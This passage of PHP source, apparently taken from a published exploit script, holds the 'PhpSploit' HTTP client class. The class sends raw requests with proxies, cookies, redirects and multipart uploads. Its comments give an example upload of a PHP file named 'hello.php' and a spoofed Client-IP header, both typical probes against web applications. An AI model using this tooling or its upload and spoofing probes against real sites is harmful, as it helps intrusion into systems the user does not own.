		return $data;
	}
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 4 / PHP 5
 * VERSION:        2.0
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 *
 * [2007-06-10] (2.0)
 *  * Code: Code optimization
 *  * New: Compatible with PHP 4 by default
 *
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit
{
	var $proxyhost;
	var $proxyport;
	var $host;
	var $path;
	var $port;
	var $method;
	var $url;
	var $packet;
	var $proxyuser;
	var $proxypass;
	var $header;
	var $cookie;
	var $data;
	var $boundary;
	var $allowredirection;
	var $last_redirection;
	var $cookiejar;
	var $recv;
	var $cookie_str;
	var $header_str;
	var $server_content;
	var $server_header;
	

	/**
	 * This function is called by the
	 * get()/post()/formdata() functions.
	 * You don&#039;t have to call it, this is
	 * the main function.
	 *
	 * @access private
	 * @return string $this-&gt;recv ServerResponse
	 * 
	 */
	function sock()
	{
		if(!empty($this-&gt;proxyhost) &amp;&amp; !empty($this-&gt;proxyport))
		   $socket = @fsockopen($this-&gt;proxyhost,$this-&gt;proxyport);
		else
		   $socket = @fsockopen($this-&gt;host,$this-&gt;port);
		
		if(!$socket)
		   die(&quot;Error: Host seems down&quot;);
		
		if($this-&gt;method==&#039;get&#039;)
		   $this-&gt;packet = &#039;GET &#039;.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;
		   
		elseif($this-&gt;method==&#039;post&#039; or $this-&gt;method==&#039;formdata&#039;)
		   $this-&gt;packet = &#039;POST &#039;.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;
		   
		else
		   die(&quot;Error: Invalid method&quot;);
		
		if(!empty($this-&gt;proxyuser))
		   $this-&gt;packet .= &#039;Proxy-Authorization: Basic &#039;.base64_encode($this-&gt;proxyuser.&#039;:&#039;.$this-&gt;proxypass).&quot;\r\n&quot;;
		
		if(!empty($this-&gt;header))
		   $this-&gt;packet .= $this-&gt;showheader();
		   
		if(!empty($this-&gt;cookie))
		   $this-&gt;packet .= &#039;Cookie: &#039;.$this-&gt;showcookie().&quot;\r\n&quot;;
	
		$this-&gt;packet .= &#039;Host: &#039;.$this-&gt;host.&quot;\r\n&quot;;
		$this-&gt;packet .= &quot;Connection: Close\r\n&quot;;
		
		if($this-&gt;method==&#039;post&#039;)
		{
			$this-&gt;packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
			$this-&gt;packet .= &#039;Content-Length: &#039;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data.&quot;\r\n&quot;;
		}
		elseif($this-&gt;method==&#039;formdata&#039;)
		{
			$this-&gt;packet .= &#039;Content-Type: multipart/form-data; boundary=&#039;.str_repeat(&#039;-&#039;,27).$this-&gt;boundary.&quot;\r\n&quot;;
			$this-&gt;packet .= &#039;Content-Length: &#039;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data;
		}

		$this-&gt;packet .= &quot;\r\n&quot;;
		$this-&gt;recv = &#039;&#039;;

		fputs($socket,$this-&gt;packet);

		while(!feof($socket))
		   $this-&gt;recv .= fgets($socket);

		fclose($socket);

		if($this-&gt;cookiejar)
		   $this-&gt;getcookie();

		if($this-&gt;allowredirection)
		   return $this-&gt;getredirection();
		else
		   return $this-&gt;recv;
	}
	

	/**
	 * This function allows you to add several
	 * cookies in the request.
	 * 
	 * @access  public
	 * @param   string cookn CookieName
	 * @param   string cookv CookieValue
	 * @example $this-&gt;addcookie(&#039;name&#039;,&#039;value&#039;)
	 * 
	 */
	function addcookie($cookn,$cookv)
	{
		if(!isset($this-&gt;cookie))
		   $this-&gt;cookie = array();

		$this-&gt;cookie[$cookn] = $cookv;
	}


	/**
	 * This function allows you to add several
	 * headers in the request.
	 *
	 * @access  public
	 * @param   string headern HeaderName
	 * @param   string headervalue Headervalue
	 * @example $this-&gt;addheader(&#039;Client-IP&#039;, &#039;128.5.2.3&#039;)
	 * 
	 */
	function addheader($headern,$headervalue)
	{
		if(!isset($this-&gt;header))
		   $this-&gt;header = array();
		   
		$this-&gt;header[$headern] = $headervalue;
	}


	/**
	 * This function allows you to use an
	 * http proxy server. Several methods
	 * are supported.
	 * 
	 * @access  public
	 * @param   string proxy ProxyHost
	 * @param   integer proxyp ProxyPort
	 * @example $this-&gt;proxy(&#039;localhost&#039;,8118)
	 * @example $this-&gt;proxy(&#039;localhost:8118&#039;)
	 * 
	 */
	function proxy($proxy,$proxyp=&#039;&#039;)
	{
		if(empty($proxyp))
		{
			$proxarr = explode(&#039;:&#039;,$proxy);
			$this-&gt;proxyhost = $proxarr[0];
			$this-&gt;proxyport = (int)$proxarr[1];
		}
		else 
		{
			$this-&gt;proxyhost = $proxy;
			$this-&gt;proxyport = (int)$proxyp;
		}

		if($this-&gt;proxyport &gt; 65535)
		   die(&quot;Error: Invalid port number&quot;);
	}
	

	/**
	 * This function allows you to use an
	 * http proxy server which requires a
	 * basic authentification. Several
	 * methods are supported:
	 *
	 * @access  public
	 * @param   string proxyauth ProxyUser
	 * @param   string proxypass ProxyPass
	 * @example $this-&gt;proxyauth(&#039;user&#039;,&#039;pwd&#039;)
	 * @example $this-&gt;proxyauth(&#039;user:pwd&#039;);
	 * 
	 */
	function proxyauth($proxyauth,$proxypass=&#039;&#039;)
	{
		if(empty($proxypass))
		{
			$posvirg = strpos($proxyauth,&#039;:&#039;);
			$this-&gt;proxyuser = substr($proxyauth,0,$posvirg);
			$this-&gt;proxypass = substr($proxyauth,$posvirg+1);
		}
		else
		{
			$this-&gt;proxyuser = $proxyauth;
			$this-&gt;proxypass = $proxypass;
		}
	}


	/**
	 * This function allows you to set
	 * the &#039;User-Agent&#039; header.
	 * 
	 * @access  public
	 * @param   string useragent Agent
	 * @example $this-&gt;agent(&#039;Firefox&#039;)
	 * 
	 */
	function agent($useragent)
	{
		$this-&gt;addheader(&#039;User-Agent&#039;,$useragent);
	}

	
	/**
	 * This function returns the headers
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this-&gt;header_str Headers
	 * @example $this-&gt;showheader()
	 * 
	 */
	function showheader()
	{
		$this-&gt;header_str = &#039;&#039;;
		
		if(!isset($this-&gt;header))
		   return;
		   
		foreach($this-&gt;header as $name =&gt; $value)
		   $this-&gt;header_str .= $name.&#039;: &#039;.$value.&quot;\r\n&quot;;
		   
		return $this-&gt;header_str;
	}

	
	/**
	 * This function returns the cookies
	 * which will be in the next request.
	 * 
	 * @access  public
	 * @return  string $this-&gt;cookie_str Cookies
	 * @example $this-&gt;showcookie()
	 * 
	 */
	function showcookie()
	{
		$this-&gt;cookie_str = &#039;&#039;;
		
		if(!isset($this-&gt;cookie))
		   return;
		
		foreach($this-&gt;cookie as $name =&gt; $value)
		   $this-&gt;cookie_str .= $name.&#039;=&#039;.$value.&#039;; &#039;;

		return $this-&gt;cookie_str;
	}


	/**
	 * This function returns the last
	 * formed http request.
	 * 
	 * @access  public
	 * @return  string $this-&gt;packet HttpPacket
	 * @example $this-&gt;showlastrequest()
	 * 
	 */
	function showlastrequest()
	{
		if(!isset($this-&gt;packet))
		   return;
		else
		   return $this-&gt;packet;
	}


	/**
	 * This function sends the formed
	 * http packet with the GET method.
	 * 
	 * @access  public
	 * @param   string url Url
	 * @return  string $this-&gt;sock()
	 * @example $this-&gt;url(&#039;localhost/index.php?var=x&#039;)
	 * @example $this-&gt;url(&#039;http://localhost:88/tst.php&#039;)
	 * 
	 */
	function get($url)
	{
		$this-&gt;target($url);
		$this-&gt;method = &#039;get&#039;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function sends the formed
	 * http packet with the POST method.
	 *
	 * @access  public
	 * @param   string url  Url
	 * @param   string data PostData
	 * @return  string $this-&gt;sock()
	 * @example $this-&gt;post(&#039;http://localhost/&#039;,&#039;helo=x&#039;)
	 * 
	 */	
	function post($url,$data)
	{
		$this-&gt;target($url);
		$this-&gt;method = &#039;post&#039;;
		$this-&gt;data = $data;
		return $this-&gt;sock();
	}
	

	/**
	 * This function sends the formed http
	 * packet with the POST method using
	 * the multipart/form-data enctype.
	 * 
	 * @access  public
	 * @param   array array FormDataArray
	 * @return  string $this-&gt;sock()
	 * @example $formdata = array(
	 *                      frmdt_url =&gt; &#039;http://localhost/upload.php&#039;,
	 *                      frmdt_boundary =&gt; &#039;123456&#039;, # Optional
	 *                      &#039;var&#039; =&gt; &#039;example&#039;,
	 *                      &#039;file&#039; =&gt; array(
	 *                                frmdt_type =&gt; &#039;image/gif&#039;,  # Optional
	 *                                frmdt_transfert =&gt; &#039;binary&#039; # Optional
	 *                                frmdt_filename =&gt; &#039;hello.php,
	 *                                frmdt_content =&gt; &#039;&lt;?php echo 1; ?&gt;&#039;));
	 *          $this-&gt;formdata($formdata);
	 * 
	 */
	function formdata($array)
	{
		$this-&gt;target($array[frmdt_url]);
		$this-&gt;method = &#039;formdata&#039;;
		$this-&gt;data = &#039;&#039;;
		
		if(!isset($array[frmdt_boundary]))
		   $this-&gt;boundary = &#039;phpsploit&#039;;
		else
		   $this-&gt;boundary = $array[frmdt_boundary];

		foreach($array as $key =&gt; $value)
		{
			if(!preg_match(&#039;#^frmdt_(boundary|url)#&#039;,$key))
			{
				$this-&gt;data .= str_repeat(&#039;-&#039;,29).$this-&gt;boundary.&quot;\r\n&quot;;
				$this-&gt;data .= &#039;Content-Disposition: form-data; name=&quot;&#039;.$key.&#039;&quot;;&#039;;
				
				if(!is_array($value))
				{
					$this-&gt;data .= &quot;\r\n\r\n&quot;.$value.&quot;\r\n&quot;;
				}
				else
				{
					$this-&gt;data .= &#039; filename=&quot;&#039;.$array[$key][frmdt_filename].&quot;\&quot;;\r\n&quot;;

					if(isset($array[$key][frmdt_type]))
					   $this-&gt;data .= &#039;Content-Type: &#039;.$array[$key][frmdt_type].&quot;\r\n&quot;;

					if(isset($array[$key][frmdt_transfert]))
					   $this-&gt;data .= &#039;Content-Transfer-Encoding: &#039;.$array[$key][frmdt_transfert].&quot;\r\n&quot;;

					$this-&gt;data .= &quot;\r\n&quot;.$array[$key][frmdt_content].&quot;\r\n&quot;;
				}
			}
		}

		$this-&gt;data .= str_repeat(&#039;-&#039;,29).$this-&gt;boundary.&quot;--\r\n&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function returns the content
	 * of the server response, without
	 * the headers.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this-&gt;server_content
	 * @example $this-&gt;getcontent()
	 * @example $this-&gt;getcontent($this-&gt;url(&#039;http://localhost/&#039;))
	 * 
	 */
	function getcontent($code=&#039;&#039;)
	{
		if(empty($code))
		   $code = $this-&gt;recv;

		$code = explode(&quot;\r\n\r\n&quot;,$code);
		$this-&gt;server_content = &#039;&#039;;
		
		for($i=1;$i&lt;count($code);$i++)
		   $this-&gt;server_content .= $code[$i];

		return $this-&gt;server_content;
	}

	
	/**
	 * This function returns the headers
	 * of the server response, without
	 * the content.
	 * 
	 * @access  public
	 * @param   string code ServerResponse
	 * @return  string $this-&gt;server_header
	 * @example $this-&gt;getcontent()
	 * @example $this-&gt;getcontent($this-&gt;post(&#039;http://localhost/&#039;,&#039;1=2&#039;))
	 * 
	 */
	function getheader($code=&#039;&#039;)
	{
		if(empty($code))
		   $code = $this-&gt;recv;

		$code = explode(&quot;\r\n\r\n&quot;,$code);
		$this-&gt;server_header = $code[0];
		
		return $this-&gt;server_header;
	}

	
	/**
	 * This function is called by the
	 * cookiejar() function. It adds the
	 * value of the &quot;Set-Cookie&quot; header
	 * in the &quot;Cookie&quot; header for the
	 * next request. You don&#039;t have to
	 * call it.
	 * 
	 * @access private
	 * @param  string code ServerResponse
	 * 
	 */
	function getcookie()
	{
		foreach(explode(&quot;\r\n&quot;,$this-&gt;getheader()) as $header)
		{
			if(preg_match(&#039;/set-cookie/i&#039;,$header))
			{
				$fequal = strpos($header,&#039;=&#039;);
				$fvirgu = strpos($header,&#039;;&#039;);
				
				// 12=strlen(&#039;set-cookie: &#039;)
				$cname  = substr($header,12,$fequal-12);
				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
				
				$this-&gt;cookie[trim($cname)] = trim($cvalu);
			}
		}
	}


	/**
	 * This function is called by the
	 * get()/post() functions. You
	 * don&#039;t have to call it.
	 *
	 * @access  private
	 * @param   string urltarg Url
	 * @example $this-&gt;target(&#039;http://localhost/&#039;)
	 * 
	 */
	function target($urltarg)
	{
		if(!ereg(&#039;^http://&#039;,$urltarg))
		   $urltarg = &#039;http://&#039;.$urltarg;
		   
		$urlarr     = parse_url($urltarg);
		$this-&gt;url  = &#039;http://&#039;.$urlarr[&#039;host&#039;].$urlarr[&#039;path&#039;];
		
		if(isset($urlarr[&#039;query&#039;]))
		   $this-&gt;url .= &#039;?&#039;.$urlarr[&#039;query&#039;];
		
		$this-&gt;port = !empty($urlarr[&#039;port&#039;]) ? $urlarr[&#039;port&#039;] : 80;
		$this-&gt;host = $urlarr[&#039;host&#039;];
		
		if($this-&gt;port != &#039;80&#039;)
		   $this-&gt;host .= &#039;:&#039;.$this-&gt;port;

		if(!isset($urlarr[&#039;path&#039;]) or empty($urlarr[&#039;path&#039;]))
		   die(&quot;Error: No path precised&quot;);

		$this-&gt;path = substr($urlarr[&#039;path&#039;],0,strrpos($urlarr[&#039;path&#039;],&#039;/&#039;)+1);

		if($this-&gt;port &gt; 65535)
		   die(&quot;Error: Invalid port number&quot;);
	}
	
	
	/**
	 * If you call this function,
	 * the script will extract all
	 * &#039;Set-Cookie&#039; headers values
	 * and it will automatically add
	 * them into the &#039;Cookie&#039; header
	 * for all next requests.
	 *
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this-&gt;cookiejar(0)
	 * @example $this-&gt;cookiejar(1)
	 * 
	 */
	function cookiejar($code)
	{
		if($code==&#039;0&#039;)
		   $this-&gt;cookiejar=FALSE;

		elseif($code==&#039;1&#039;)
		   $this-&gt;cookiejar=TRUE;
	}


	/**
	 * If you call this function,
	 * the script will follow all
	 * redirections sent by the server.
	 * 
	 * @access  public
	 * @param   integer code 1(enabled) 0(disabled)
	 * @example $this-&gt;allowredirection(0)
	 * @example $this-&gt;allowredirection(1)
	 * 
	 */
	function allowredirection($code)
	{
		if($code==&#039;0&#039;)
		   $this-&gt;allowredirection=FALSE;
		   
		elseif($code==&#039;1&#039;)
		   $this-&gt;allowredirection=TRUE;
	}

	
	/**
	 * This function is called if
	 * allowredirection() is enabled.
	 * You don&#039;t have to call it.
	 *
	 * @access private
	 * @return string $this-&gt;url(&#039;http://&#039;.$this-&gt;host.$this-&gt;path.$this-&gt;last_redirection)
	 * @return string $this-&gt;url($this-&gt;last_redirection)
	 * @return string $this-&gt;recv;
	 * 
	 */
	function getredirection()
	{
		if(preg_match(&#039;/(location|content-location|uri): (.*)/i&#039;,$this-&gt;getheader(),$codearr))
		{
			$this-&gt;last_redirection = trim($codearr[2]);
			
			if(!ereg(&#039;://&#039;,$this-&gt;last_redirection))
			   return $this-&gt;url(&#039;http://&#039;.$this-&gt;host.$this-&gt;path.$this-&gt;last_redirection);

			else
			   return $this-&gt;url($this-&gt;last_redirection);
		}
		else
		   return $this-&gt;recv;
	}


	/**
	 * This function allows you
	 * to reset some parameters.
	 * 
	 * @access  public
	 * @param   string func Param
	 * @example $this-&gt;reset(&#039;header&#039;)
	 * @example $this-&gt;reset(&#039;cookie&#039;)
	 * @example $this-&gt;reset()
	 * 
	 */
	function reset($func=&#039;&#039;)
	{
		switch($func)
		{
			case &#039;header&#039;:
			$this-&gt;header = array();
			break;
				
			case &#039;cookie&#039;:
			$this-&gt;cookie = array();
			break;
				
			default:
			$this-&gt;cookiejar = &#039;&#039;;
			$this-&gt;header = array();
			$this-&gt;cookie = array();
			$this-&gt;allowredirection = &#039;&#039;;
			break;
		}
	}
}

?&gt;

